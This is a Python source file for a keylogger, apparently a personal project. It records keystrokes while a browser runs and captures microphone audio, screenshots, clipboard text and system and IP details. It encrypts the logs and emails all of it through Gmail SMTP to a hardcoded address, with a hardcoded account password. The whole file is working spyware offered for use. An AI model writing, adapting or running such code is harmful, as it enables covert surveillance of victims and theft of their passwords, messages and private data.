#   basic keylogger

# imports
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import socket
import platform

import win32clipboard
import time
import os
from scipy.io import wavfile
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import psutil as psutil

key = "UEEnOeF61l4St2C_-0LRcCXxmPiaQq49REBPzJpEovo="  # current encryption key generated
system_info = "sysinfo.txt"
file_pth = "C:\\Users\\1kath\\PycharmProjects\\keylogger-v1\\project"
extend = "\\"
file_merge = file_pth + extend
clipboard_info = "clipboard.txt"
keys_information = "log.txt"

email_address = "junkgitemail@gmail.com"
password = "junkgitemail1234!"
toaddr = email_address

microphone_time = 10  # this is in seconds
audio_info = "audio.wav"

screenshot_info = "screenshot.png"

keys_information_e = "log_e.txt"
system_info_e = "sysinfo_e.txt"
clipboard_info_e = "clipboard_e.txt"


def screenshot():  # take a screenshot. note, this only takes a sc of the 'primary' screen

    im = ImageGrab.grab()
    im.save(file_pth + extend + screenshot_info)


def get_microphone():  # record microphone audio for a predetermined amount of time
    fs = 44100  # sampling frequency, this is a common sampling freq
    timer = microphone_time  # wiill need to change this later to align with acutal timer

    recording = sd.rec((timer * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_pth + extend + audio_info, fs, recording)


def copy_clipboard():  # get any text that is copied on the clipboard
    with open(file_pth + extend + clipboard_info, "a") as f:
        try:  # this only works if the clipboard is a string FIND A WAY TO GET SCREENSHOT CLIPBOARDS
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("clipboard data:" + "\n" + pasted_data)
        except:
            f.write("clipboard could not be copied")


def get_computer_info():  # get common computer information
    with open(file_pth + extend + system_info, "a") as f:
        hostnme = socket.gethostname()
        IPAdd = socket.gethostbyname(hostnme)
        try:
            public_IP = get("https://api.ipify.org").text
            f.write("public IP address" + public_IP)
        except Exception:
            f.write("IP Address could not be obtained. probably max query")

        f.write("processor: " + (platform.processor()) + '\n')
        f.write("system:" + platform.system() + " " + platform.version() + '\n')
        f.write("machine:" + platform.machine() + '\n')
        f.write('hostname:' + hostnme + '\n')
        f.write("private ip address:" + IPAdd + '\n')


def send_email(filename, attachment, toaddr):  # send files by email
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "log file"

    body = "body of mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)
    s.quit()


num_iterations = 0
time_iteration = 15  # each iteration = 15 seconds
currTime = time.time()
stopTime = time.time() + time_iteration
end_iterations = 3  # 3 iterations total

for proc in psutil.process_iter():
    proc_name = proc.name()
    if proc_name == 'chrome.exe' or proc_name == 'firefox.exe' or proc_name == 'safari.exe':
        # run keylogger if there is a search engine active, then start the timer
        if num_iterations < end_iterations:

            count = 0
            keys = []


            def on_press(key):
                global keys, count, currTime
                keys.append(key)
                count += 1
                currTime = time.time()
                print("{} pressed".format(key))

                if count >= 1:
                    count = 0
                    write_file(keys)
                    keys = []


            def write_file(keys):  # write the keys logged to a file
                with open(file_pth + extend + keys_information, "a") as f:
                    for key in keys:
                        k = str(key).replace("'", "")  # replace single quotes with nothing
                        if k.find("enter") > 0:  # replace 'enter' with a newline
                            f.write('\n')
                            f.close()
                        elif k.find("Key") == -1:  # if key is anything else write to file
                            f.write(k)
                            f.close()


            def on_release(key):  # this is redundant because of the timer and if loop above it.
                if key == Key.esc:
                    return False
                if currTime > stopTime:  # stops key log itself
                    return False


            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

            if currTime > stopTime:  # stops all other features
                with open(file_pth + extend + keys_information, "w") as f:  # clear out logs
                    f.write(" ")

            # get all features and email
            get_microphone()
            send_email(audio_info, file_pth + extend + audio_info, toaddr)

            get_computer_info()
            send_email(system_info, file_pth + extend + system_info, toaddr)

            copy_clipboard()
            send_email(clipboard_info, file_pth + extend + clipboard_info, toaddr)

            screenshot()
            send_email(screenshot_info, file_pth + extend + screenshot_info, toaddr)

            num_iterations += 1
            currTime = time.time()
            stopTime = time.time() + time_iteration
    break  # jump out of the initial loop that checked whether a search engine is running

#   starting the encryption process
files_tob_e = [file_merge + system_info,  # files to be encrypted
               file_merge + clipboard_info,
               file_merge + keys_information]

e_file_names = [file_merge + system_info_e,  # encrypted file names
                file_merge + clipboard_info_e,
                file_merge + keys_information_e]

count = 0
for encrypting_file in files_tob_e:
    with open(files_tob_e[count], 'rb') as f:  # open up each file
        data = f.read()  # read the data

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(e_file_names[count], 'wb') as f:  # append encrypted files to new files
        f.write(encrypted)

    send_email(e_file_names[count], e_file_names[count], toaddr)  # send encrypted files by email
    count += 1
time.sleep(120)  # each iteration to slepe for 2 emails for emails to be sent
